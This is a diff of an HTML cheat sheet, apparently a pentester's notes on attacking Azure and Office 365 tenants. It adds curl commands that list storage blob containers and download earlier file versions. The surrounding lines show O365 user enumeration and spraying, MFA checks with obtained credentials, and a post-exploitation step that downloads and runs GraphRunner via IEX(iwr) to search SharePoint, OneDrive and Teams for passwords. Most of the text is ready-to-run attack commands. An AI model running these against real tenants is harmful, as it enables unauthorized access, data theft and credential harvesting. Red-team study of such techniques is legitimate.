@@ -20,6 +20,17 @@ python3 azsubenum.py -b domain -p permutations.txt -v
 python3 omnispray.py -m o365_enum_office -d example.com -uf ~/Documents/userList.txt
 </code></pre><p>Checking Azure MFA (Assuming Credentials are obtained)</p><pre tabindex=0><code>Github: https://github.com/dafthack/MFASweep
 Invoke-MFASweep -Username &lt;Username&gt; -Password &lt;password&gt; -Recon -IncludeADFS
+</code></pre><p>Blob Enumeration</p><pre tabindex=0><code>Format
+https://&lt;storageAccount&gt;.blob.core.windows.net/&lt;containername&gt;/file.txt
+
+//List Directories in Blob
+https://&lt;storageAccount&gt;.blob.core.windows.net/&lt;containername&gt;?restype=container&amp;comp=list&amp;delimiter=%2F
+
+//Check for Versioning in blob
+curl -H &#34;x-ms-version: 2019-12-12&#34; &#39;https://&lt;storageAccount&gt;.blob.core.windows.net/&lt;containername&gt;?restype=container&amp;comp=list&amp;include=versions&#39; | xmllint --format - | less
+
+//Download Potential Files (assuming versioning is enabled)
+curl -H &#34;x-ms-version: 2019-12-12&#34; &#39;https://&lt;storageAccount&gt;.blob.core.windows.net/&lt;containername&gt;/file.zip?versionId=&lt;VersionID&gt;&#39; --output file.zip
 </code></pre></div></div></div></div><div class=note-card><div class=item><h5 class=note-title><span>Post Exploitation</span></h5><div class=card><div class=card-body><p>GraphRunner to enumerate Office Products</p><pre tabindex=0><code>IEX (iwr &#39;https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1&#39;)
 Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm &#39;password filetype:xlsx&#39;
 Invoke-SearchTeams -Tokens $tokens -SearchTerm password
